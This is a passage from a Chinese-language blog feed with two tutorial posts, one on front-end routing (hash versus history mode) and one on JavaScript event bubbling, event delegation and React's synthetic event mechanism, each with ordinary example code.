        <content type="html"><![CDATA[<p>在学习vue-router时，了解到前端路由的两种模式，本文就前端路由，及其两种模式的原理和使用场景，做一个整理总结。</p><a id="more"></a><h2 id="前端路由概述"><a href="#前端路由概述" class="headerlink" title="前端路由概述"></a>前端路由概述</h2><h3 id="什么是路由"><a href="#什么是路由" class="headerlink" title="什么是路由"></a>什么是路由</h3><p>路由这个概念最先是后端出现的，简单来说路由就是用来跟后端服务器进行交互的一种方式，通过不同的路径，来请求不同的资源，请求不同的页面是路由的其中一种功能。</p><h3 id="前端路由的诞生"><a href="#前端路由的诞生" class="headerlink" title="前端路由的诞生"></a>前端路由的诞生</h3><p>前端路由的出现要从 ajax 开始，有了 Ajax 后，用户交互就不用每次都刷新页面，体验带来了极大的提升。随着技术的发展，简单的异步已经不能满足需求，所以异步的更高级体验出现了——SPA(单页应用)。<br>SPA 的出现大大提高了 WEB 应用的交互体验。在与用户的交互过程中，不再需要重新刷新页面，获取数据也是通过 Ajax 异步获取，页面显示变的更加流畅。<br>但由于 SPA 中用户的交互是通过 JS 改变 HTML 内容来实现的，页面本身的 url 并没有变化，这导致了两个问题：</p><ul><li>SPA 无法记住用户的操作记录，无论是刷新、前进还是后退，都无法展示用户真实的期望内容。</li><li>SPA 中虽然由于业务的不同会有多种页面展示形式，但只有一个 url，对 SEO 不友好，不方便搜索引擎进行收录。</li></ul><p>前端路由就是为了解决上述问题而出现的。</p><h3 id="什么是前端路由"><a href="#什么是前端路由" class="headerlink" title="什么是前端路由"></a>什么是前端路由</h3><p>简单的说，就是在保证只有一个 HTML 页面，且与用户交互时不刷新和跳转页面的同时，为 SPA 中的每个视图展示形式匹配一个特殊的 url。在刷新、前进、后退和SEO时均通过这个特殊的 url 来实现。<br>为实现这一目标，我们需要做到以下二点：</p><ul><li>改变 url 且不让浏览器像服务器发送请求。</li><li>可以监听到 url 的变化</li></ul><p>接下来要介绍的 hash 模式和 history 模式，就是实现了上面的功能。</p><h2 id="Hash模式"><a href="#Hash模式" class="headerlink" title="Hash模式"></a>Hash模式</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul><li>早期的前端路由的实现就是基于location.hash来实现的，location.hash的值就是URL中#后面的内容<br>其实现原理就是监听#后面的内容来发起Ajax请求来进行局部更新，而不需要刷新整个页面。</li><li>使用hashchange事件来监听 URL 的变化，以下这几种情况改变 URL 都会触发 hashchange 事件：浏览器前进后退改变 URL、a标签改变 URL、window.location改变URL。</li></ul><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">//html</span><br><span class="line">&lt;ul id=&quot;menu&quot;&gt;</span><br><span class="line">  &lt;li&gt;</span><br><span class="line">    &lt;a href=&quot;#index&quot;&gt;首页&lt;/a&gt;</span><br><span class="line">  &lt;/li&gt;</span><br><span class="line">  &lt;li&gt;</span><br><span class="line">    &lt;a href=&quot;#news&quot;&gt;资讯&lt;/a&gt;</span><br><span class="line">  &lt;/li&gt;</span><br><span class="line">  &lt;li&gt;</span><br><span class="line">    &lt;a href=&quot;#user&quot;&gt;个人中心&lt;/a&gt;</span><br><span class="line">  &lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">//js</span><br><span class="line">function hashChange(e)&#123;</span><br><span class="line">    let app = document.getElementById(&apos;app&apos;)</span><br><span class="line">    switch (location.hash) &#123;</span><br><span class="line">      case &apos;#index&apos;:</span><br><span class="line">        app.innerHTML = &apos;&lt;h1&gt;这是首页内容&lt;/h1&gt;&apos;</span><br><span class="line">        break</span><br><span class="line">      case &apos;#news&apos;:</span><br><span class="line">        app.innerHTML = &apos;&lt;h1&gt;这是新闻内容&lt;/h1&gt;&apos;</span><br><span class="line">        break</span><br><span class="line">      case &apos;#user&apos;:</span><br><span class="line">        app.innerHTML = &apos;&lt;h1&gt;这是个人中心内容&lt;/h1&gt;&apos;</span><br><span class="line">        break</span><br><span class="line">      default:</span><br><span class="line">        app.innerHTML = &apos;&lt;h1&gt;404&lt;/h1&gt;&apos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">window.onhashchange = hashChange</span><br><span class="line">hashChange()</span><br></pre></td></tr></table></figure><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>兼容低版本浏览器，Angular1.x和Vue默认使用的就是hash路由</li><li>只有#符号之前的内容才会包含在请求中被发送到后端，也就是说就算后端没有对路由全覆盖，但是不会返回404错误</li><li>hash值的改变，都会在浏览器的访问历史中增加一个记录，所以可以通过浏览器的回退、前进按钮控制hash的切换<br>会覆盖锚点定位元素的功能</li></ul><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul><li>不太美观，#后面传输的数据复杂的话会出现问题</li></ul><h2 id="History模式"><a href="#History模式" class="headerlink" title="History模式"></a>History模式</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><ul><li>history 提供了 pushState 和 replaceState 两个方法来记录路由状态，这两个方法改变 URL 不会引起页面刷新</li><li>history 提供类似 hashchange 事件的 popstate 事件，但 popstate 事件有些不同：通过浏览器前进后退改变 URL 时会触发 popstate 事件，通过pushState/replaceState或a标签改变 URL 不会触发 popstate 事件。好在我们可以拦截 pushState/replaceState的调用和a标签的点击事件来检测 URL 变化，所以监听 URL 变化可以实现，只是没有 hashchange 那么方便。</li><li>pushState(state, title, url) 和 replaceState(state, title, url)都可以接受三个相同的参数。</li></ul><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">//html</span><br><span class="line">&lt;ul id=&quot;menu&quot;&gt;</span><br><span class="line">  &lt;li&gt;</span><br><span class="line">    &lt;a href=&quot;/index&quot;&gt;首页&lt;/a&gt;</span><br><span class="line">  &lt;/li&gt;</span><br><span class="line">  &lt;li&gt;</span><br><span class="line">    &lt;a href=&quot;/news&quot;&gt;资讯&lt;/a&gt;</span><br><span class="line">  &lt;/li&gt;</span><br><span class="line">  &lt;li&gt;</span><br><span class="line">    &lt;a href=&quot;/user&quot;&gt;个人中心&lt;/a&gt;</span><br><span class="line">  &lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">//js</span><br><span class="line">document.querySelector(&apos;#menu&apos;).addEventListener(&apos;click&apos;,function (e) &#123;</span><br><span class="line">  if(e.target.nodeName ===&apos;A&apos;)&#123;</span><br><span class="line">    e.preventDefault()</span><br><span class="line">    let path = e.target.getAttribute(&apos;href&apos;)  //获取超链接的href，改为pushState跳转，不刷新页面</span><br><span class="line">    window.history.pushState(&#123;&#125;,&apos;&apos;,path)  //修改浏览器中显示的url地址</span><br><span class="line">    render(path)  //根据path，更改页面内容</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">function render(path) &#123;</span><br><span class="line">  let app = document.getElementById(&apos;app&apos;)</span><br><span class="line">  switch (path) &#123;</span><br><span class="line">    case &apos;/index&apos;:</span><br><span class="line">      app.innerHTML = &apos;&lt;h1&gt;这是首页内容&lt;/h1&gt;&apos;</span><br><span class="line">      break</span><br><span class="line">    case &apos;/news&apos;:</span><br><span class="line">      app.innerHTML = &apos;&lt;h1&gt;这是新闻内容&lt;/h1&gt;&apos;</span><br><span class="line">      break</span><br><span class="line">    case &apos;/user&apos;:</span><br><span class="line">      app.innerHTML = &apos;&lt;h1&gt;这是个人中心内容&lt;/h1&gt;&apos;</span><br><span class="line">      break</span><br><span class="line">    default:</span><br><span class="line">      app.innerHTML = &apos;&lt;h1&gt;404&lt;/h1&gt;&apos;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">window.onpopstate = function (e) &#123;</span><br><span class="line">  render(location.pathname)</span><br><span class="line">&#125;</span><br><span class="line">render(&apos;/index&apos;)</span><br></pre></td></tr></table></figure><h3 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h3><ul><li>使用简单，比较美观</li><li>pushState()设置新的URL可以是任意与当前URL同源的URL，而hash只能改变#后面的内容，因此只能设置与当前URL同文档的URL</li><li>pushState()设置的URL与当前URL一模一样时也会被添加到历史记录栈中，而hash#后面的内容必须被修改才会被添加到新的记录栈中</li><li>pushState()可以通过stateObject参数添加任意类型的数据到记录中，而hash只能添加短字符串</li><li>pushState()可额外设置title属性供后续使用</li></ul><h3 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h3><ul><li>前端的URL必须和向发送请求后端URL保持一致，否则会报404错误</li><li>由于History API的缘故，低版本浏览器有兼容行问题</li></ul><h2 id="两种不同使用场景"><a href="#两种不同使用场景" class="headerlink" title="两种不同使用场景"></a>两种不同使用场景</h2><ul><li>从上文可见，hash模式下url会带有#，当你希望url更优雅时，可以使用history模式。</li><li>当使用history模式时，需要注意在服务端增加一个覆盖所有情况的候选资源：如果 URL 匹配不到任何静态资源，则应该返回同一个 index.html 页面，这个页面就是你 app 依赖的页面。</li><li>当需要兼容低版本的浏览器时，建议使用hash模式。</li><li>当需要添加任意类型数据到记录时，可以使用history模式。</li></ul><p>参考链接：</p><ul><li><a href="https://juejin.im/post/5da9d07c6fb9a04de6513a82" target="_blank" rel="noopener">前端框架路由实现</a></li><li><a href="https://www.jianshu.com/p/5aab4a6711d5" target="_blank" rel="noopener">前端路由的两种模式</a></li><li><a href="http://m.shanhuxueyuan.com/news/detail/137.html" target="_blank" rel="noopener">两种前端路由（hash模式和history模式）实现原理解析及区别</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 路由 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS事件冒泡和事件委托</title>
      <link href="/JS%E4%BA%8B%E4%BB%B6%E5%86%92%E6%B3%A1%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%A7%94%E6%89%98.html"/>
      <url>/JS%E4%BA%8B%E4%BB%B6%E5%86%92%E6%B3%A1%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%A7%94%E6%89%98.html</url>
      
        <content type="html"><![CDATA[<p>最近在学习React的时候，看到了React实现合成事件的底层机制，事件委托一词赫然出现在眼前，于是我不由的想到在不久前的一次面试中，面试官曾让我写一个冒泡阶段的事件委托，今天借着对React的理解，再来深入探讨一下JS中的事件冒泡和事件委托。</p><a id="more"></a><h2 id="事件流"><a href="#事件流" class="headerlink" title="事件流"></a>事件流</h2><p>“DOM2级事件”规定的事件流包括三个阶段：事件捕获阶段，处于目标阶段和事件冒泡阶段。<br><img src="../assets/20191215/1.png" alt="Alt text"></p><table><thead><tr><th style="text-align:center">阶段</th><th style="text-align:left">描述</th><th style="text-align:center">传播方向</th></tr></thead><tbody><tr><td style="text-align:center">事件捕获</td><td style="text-align:left">不太具体的节点应该更早接收到事件，而具体的节点应该最后接收到事件</td><td style="text-align:center">DOM树依次向下</td></tr><tr><td style="text-align:center">事件冒泡</td><td style="text-align:left">由最具体的元素开始接收，逐级向上传播到较为不具体的节点</td><td style="text-align:center">DOM树向上</td></tr></tbody></table><p>在DOM2级事件处理程序操作 <code>addEventListener()</code> 和 <code>removeEventListener()</code> 方法中，其第三个参数接收一个布尔值，用于指定事件处理程序在何时进行。</p><ul><li>值为true：表示在捕获阶段调用事件处理程序</li><li>值为false：表示在冒泡阶段调用事件处理程序</li></ul><p>这里是我们处在level菜鸟阶段最先接触到有关事件冒泡和事件捕获的方法了，但是由于事件捕获在浏览器的兼容情况并不乐观，所以大多数情况我们不建议在事件捕获阶段注册事件处理程序。</p><h2 id="事件对象"><a href="#事件对象" class="headerlink" title="事件对象"></a>事件对象</h2><p>在正式开始介绍事件委托之前，我们先来了解一下事件对象。</p><blockquote><p>触发DOM上的某个事件时，会产生一个事件对象event，这个对象中包含着所有与事件有关的信息。</p></blockquote><p>这是红宝书里对事件对象的解释，下表列出了事件对象的部分属性和方法 。</p><table><thead><tr><th style="text-align:center">属性 / 方法</th><th style="text-align:center">类型</th><th style="text-align:center">读 / 写</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:center">type</td><td style="text-align:center">String</td><td style="text-align:center">只读</td><td style="text-align:left">被触发的事件的类型</td></tr><tr><td style="text-align:center">target</td><td style="text-align:center">Element</td><td style="text-align:center">只读</td><td style="text-align:left">事件的目标</td></tr><tr><td style="text-align:center">currentTarget</td><td style="text-align:center">Element</td><td style="text-align:center">只读</td><td style="text-align:left">其事件处理程序当前正在处理事件的那个元素</td></tr><tr><td style="text-align:center">preventDefault()</td><td style="text-align:center">Function</td><td style="text-align:center">只读</td><td style="text-align:left">取消事件的默认行为</td></tr><tr><td style="text-align:center">stopPropagation</td><td style="text-align:center">Function</td><td style="text-align:center">只读</td><td style="text-align:left">取消事件的进一步捕获或冒泡</td></tr><tr><td style="text-align:center">stopImmediatePropagation</td><td style="text-align:center">Function</td><td style="text-align:center">只读</td><td style="text-align:left">取消事件的进一步捕获或冒泡，同时阻止任何事件处理程序被调用</td></tr></tbody></table><h3 id="target-和-currentTarget"><a href="#target-和-currentTarget" class="headerlink" title="target 和 currentTarget"></a>target 和 currentTarget</h3><p>在事件处理程序内部，对象this始终等于currentTarget的值，而target则只包含事件的实际目标。</p><ul><li>当事件处理程序直接指定给了目标元素，this、currentTarget、target包含相同的值。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var btn = document.getElementById(&quot;myBtn&quot;);</span><br><span class="line">btn.onclick = function(e) &#123;</span><br><span class="line">  console.log(e.currentTarget === this); //true</span><br><span class="line">  console.log(e.target === this); //true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>当事件处理程序存在于按钮的父节点中，这三者的值不相同。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">document.body.onclick = function(e) &#123;</span><br><span class="line">  console.log(this === document.body); //true</span><br><span class="line">  console.log(e.currentTarget === document.body); //true</span><br><span class="line">  console.log(e.target === document.getElementById(&quot;myBtn&quot;)); //true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述例子中，click事件的真正目标是target的按钮元素，但由于没有在按钮元素上注册事件处理程序，所以click事件一只冒泡到了document.body后才被处理。</p><p>由上，我们可以得出更通俗的对target 和 currentTarget的解释。</p><ul><li>target：当前被点击的实际元素</li><li>currentTarget：注册了事件处理程序的元素</li></ul><h3 id="peventDefault"><a href="#peventDefault" class="headerlink" title="peventDefault()"></a>peventDefault()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var link = document.getElementById(&quot;myLink&quot;);</span><br><span class="line">link.onclick = function(e) &#123;</span><br><span class="line">  e.preventDefault();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述例子阻止了链接默认跳转到其href指定的URL。</p><h4 id="FastClick原理"><a href="#FastClick原理" class="headerlink" title="FastClick原理"></a>FastClick原理</h4><p>说到阻止事件默认行为，不得不提移动端常用的FastClick。其实现原理是这样的：</p><ul><li>注册业务onclick事件</li><li>在touchend阻止默认事件（屏蔽之后的click事件）</li><li>合成一个click事件，并立即执行</li><li>执行业务自己的click事件</li></ul><p>下面可以看一个模拟FastClick的代码案例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// 业务代码</span><br><span class="line">var $test = document.getElementById(&apos;test&apos;)</span><br><span class="line">$test.addEventListener(&apos;click&apos;, function () &#123;</span><br><span class="line">  console.log(&apos;1 click&apos;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// FastClick简单实现</span><br><span class="line">var targetElement = null</span><br><span class="line">document.body.addEventListener(&apos;touchstart&apos;, function () &#123;</span><br><span class="line">  // 记录点击的元素</span><br><span class="line">  targetElement = event.target</span><br><span class="line">&#125;)</span><br><span class="line">document.body.addEventListener(&apos;touchend&apos;, function (event) &#123;</span><br><span class="line">  // 阻止默认事件（屏蔽之后的click事件）</span><br><span class="line">  event.preventDefault()</span><br><span class="line">  var touch = event.changedTouches[0]</span><br><span class="line">  // 合成click事件，并添加可跟踪属性forwardedTouchEvent</span><br><span class="line">  var clickEvent = document.createEvent(&apos;MouseEvents&apos;)</span><br><span class="line">  clickEvent.initMouseEvent(&apos;click&apos;, true, true, window, 1, touch.screenX, touch.screenY, touch.clientX, touch.clientY, false, false, false, false, 0, null)</span><br><span class="line">  clickEvent.forwardedTouchEvent = true // 自定义的</span><br><span class="line">  targetElement.dispatchEvent(clickEvent)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="stopPropagation-和-stopImmediatePropagation"><a href="#stopPropagation-和-stopImmediatePropagation" class="headerlink" title="stopPropagation 和 stopImmediatePropagation"></a>stopPropagation 和 stopImmediatePropagation</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var btn = document.getElementById(&quot;myBtn&quot;);</span><br><span class="line">btn.onclick = function(e) &#123;</span><br><span class="line">  alert(&quot;Clicked&quot;);</span><br><span class="line">  e.stopPropagation();</span><br><span class="line">&#125;</span><br><span class="line">document.body.onclick = function(e) &#123;</span><br><span class="line">  alert(&quot;Body clicked&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述例子，在点击事件在目标元素上被执行后就阻止了冒泡，防止其传播到body。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var btn = document.getElementById(&quot;myBtn&quot;);</span><br><span class="line">btn.addEventListener(&quot;click&quot;, function(e) &#123;</span><br><span class="line">  alert(&quot;Clicked before&quot;);</span><br><span class="line">  e.stopImmediatePropagation();</span><br><span class="line">&#125;, false);</span><br><span class="line">btn.addEventListener(&quot;click&quot;, function(e) &#123;</span><br><span class="line">  alert(&quot;Clicked after&quot;);</span><br><span class="line">&#125;, false);</span><br><span class="line">document.body.addEventListener(&quot;click&quot;, function(e) &#123;</span><br><span class="line">  alert(&quot;Body clicked&quot;);</span><br><span class="line">&#125;, false);</span><br></pre></td></tr></table></figure><p>在上述例子中，使用了stopImmediatePropagation阻止冒泡，绑定在该按钮上的同类事件，没有执行完的也将被阻止。</p><h2 id="事件委托"><a href="#事件委托" class="headerlink" title="事件委托"></a>事件委托</h2><p>事件委托利用了事件冒泡，只指定一个事件处理程序，就可以管理某一类型的所有事件。例如，click事件会一直冒泡到document层次，也就是是说我们可以为整个页面指定一个onclick事件处理程序，而不必给每个可单击元素分别添加事件处理程序。<br>现在我们回到那个面试题，来写一个事件委托的方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @param type：String，事件类型</span><br><span class="line"> * @param element：DOM element，目标元素</span><br><span class="line"> * @param callback：Function，业务事件处理程序</span><br><span class="line">*/ </span><br><span class="line">function eventHandler(type, element, callback) &#123;</span><br><span class="line">  document.addEventListener(type, function(e)&#123;</span><br><span class="line">    if(e.target === element) &#123;</span><br><span class="line">      callback.call(this);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, false);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="React-合成事件的实现原理"><a href="#React-合成事件的实现原理" class="headerlink" title="React 合成事件的实现原理"></a>React 合成事件的实现原理</h3><p>React 合成事件是把所有事件绑定到结构的最外层，使用一个统一的事件监听器，以队列的方式，从触发事件的组件向父组件回溯，调用它们在JSX中声明的callback。<br>其中涉及到几个重要的类如下：</p><ul><li>ReactEventListener：负责事件注册和事件分发。React将DOM事件全都注册到document这个节点上。事件分发主要调用dispatchEvent进行，从事件触发组件开始，向父元素遍历。</li><li>ReactEventEmitter：负责每个组件上事件的执行。</li><li>EventPluginHub：负责事件的存储，合成事件以对象池的方式实现创建和销毁，大大提高了性能。</li><li>SimpleEventPlugin等plugin：根据不同的事件类型，构造不同的合成事件。如focus对应的React合成事件为SyntheticFocusEvent</li></ul><h4 id="事件注册"><a href="#事件注册" class="headerlink" title="事件注册"></a>事件注册</h4><p>组件创建和更新的入口方法mountComponent和updateComponent都会调用_updateDOMProperties方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_updateDOMProperties: function (lastProps, nextProps, transaction) &#123;</span><br><span class="line">    ... // 前面代码太长，省略一部分</span><br><span class="line">    else if (registrationNameModules.hasOwnProperty(propKey)) &#123;</span><br><span class="line">        // 如果是props这个对象直接声明的属性，而不是从原型链中继承而来的，则处理它</span><br><span class="line">        // nextProp表示要创建或者更新的属性，而lastProp则表示上一次的属性</span><br><span class="line">        // 对于mountComponent，lastProp为null。updateComponent二者都不为null。unmountComponent则nextProp为null</span><br><span class="line">        if (nextProp) &#123;</span><br><span class="line">          // mountComponent和updateComponent中，enqueuePutListener注册事件</span><br><span class="line">          enqueuePutListener(this, propKey, nextProp, transaction);</span><br><span class="line">        &#125; else if (lastProp) &#123;</span><br><span class="line">          // unmountComponent中，删除注册的listener，防止内存泄漏</span><br><span class="line">          deleteListener(this, propKey);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>下面我们来看enqueuePutListener，它负责注册JSX中声明的事件。源码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">/ inst: React Component对象</span><br><span class="line">// registrationName: React合成事件名，如onClick</span><br><span class="line">// listener: React事件回调方法，如onClick=callback中的callback</span><br><span class="line">// transaction: mountComponent或updateComponent所处的事务流中，React都是基于事务流的</span><br><span class="line">function enqueuePutListener(inst, registrationName, listener, transaction) &#123;</span><br><span class="line">  if (transaction instanceof ReactServerRenderingTransaction) &#123;</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  var containerInfo = inst._hostContainerInfo;</span><br><span class="line">  var isDocumentFragment = containerInfo._node &amp;&amp; containerInfo._node.nodeType === DOC_FRAGMENT_TYPE;</span><br><span class="line">  // 找到document</span><br><span class="line">  var doc = isDocumentFragment ? containerInfo._node : containerInfo._ownerDocument;</span><br><span class="line">  // 注册事件，将事件注册到document上</span><br><span class="line">  listenTo(registrationName, doc);</span><br><span class="line">  // 存储事件,放入事务队列中</span><br><span class="line">  transaction.getReactMountReady().enqueue(putListener, &#123;</span><br><span class="line">    inst: inst,</span><br><span class="line">    registrationName: registrationName,</span><br><span class="line">    listener: listener</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>enqueuePutListener方法主要做了两件事，一是将JSX声明的事件注册到document元素上，一是将事件存储放入事务队列，以供事件触发时回调。<br>listenTo代码虽然比较长，但逻辑很简单，调用trapCapturedEvent和trapBubbledEvent来注册捕获和冒泡事件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">trapBubbledEvent: function (topLevelType, handlerBaseName, element) &#123;</span><br><span class="line">    if (!element) &#123;</span><br><span class="line">      return null;</span><br><span class="line">    &#125;</span><br><span class="line">    return EventListener.listen(</span><br><span class="line">      element,   // 绑定到的DOM目标,也就是document</span><br><span class="line">      handlerBaseName,   // eventType</span><br><span class="line">      ReactEventListener.dispatchEvent.bind(null, topLevelType));  // callback, document上的原生事件触发后回调</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  listen: function listen(target, eventType, callback) &#123;</span><br><span class="line">    if (target.addEventListener) &#123;</span><br><span class="line">      // 将原生事件添加到target这个dom上,也就是document上。</span><br><span class="line">      // 这就是只有document这个DOM节点上有原生事件的原因</span><br><span class="line">      target.addEventListener(eventType, callback, false);</span><br><span class="line">      return &#123;</span><br><span class="line">        // 删除事件,这个由React自己回调,不需要调用者来销毁。但仅仅对于React合成事件才行</span><br><span class="line">        remove: function remove() &#123;</span><br><span class="line">          target.removeEventListener(eventType, callback, false);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; else if (target.attachEvent) &#123;</span><br><span class="line">      // attach和detach的方式</span><br><span class="line">      target.attachEvent(&apos;on&apos; + eventType, callback);</span><br><span class="line">      return &#123;</span><br><span class="line">        remove: function remove() &#123;</span><br><span class="line">          target.detachEvent(&apos;on&apos; + eventType, callback);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>在listen方法中，我们终于发现了熟悉的addEventListener这个原生事件注册方法。只有document节点才会调用这个方法，故仅仅只有document节点上才有DOM事件。这大大简化了DOM事件逻辑，也节约了内存。</p><p>有关事件存储的过程我们就不是我们本文的重点，就跳过，有兴趣的可以去看一下参考链接中的文章。</p><h4 id="事件执行"><a href="#事件执行" class="headerlink" 